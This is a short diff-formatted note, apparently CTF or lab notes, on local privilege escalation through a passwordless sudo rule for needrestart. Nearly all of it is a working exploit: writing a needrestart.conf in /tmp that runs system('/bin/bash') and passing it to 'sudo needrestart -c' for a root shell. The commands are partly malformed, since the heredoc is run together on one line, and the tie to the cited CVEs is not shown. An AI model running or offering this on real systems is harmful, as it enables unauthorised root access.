@@ -1,0 +1,42 @@
+using guest user shell hit 
+$sodo -l  
+(ALL : ALL) NOPASSWD: /usr/sbin/needrestart   # returned which is vulnerable to
+# CVE-2024-48990 / CVE-2024-48991 – needrestart allows config file override that can lead to arbitrary command execution. 
+
+The exploit is literally 3 lines: 
+$mkdir -p /tmp/.needrestart cat > /tmp/.needrestart/needrestart.conf <<EOF $nrconf{ui} = 'NeedRestart::UI::stdio'; system("/bin/bash"); EOF 
+$sudo needrestart -c /tmp/.needrestart/needrestart.conf 
+→ instant root shell. 
+=============================================================================================================================================
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
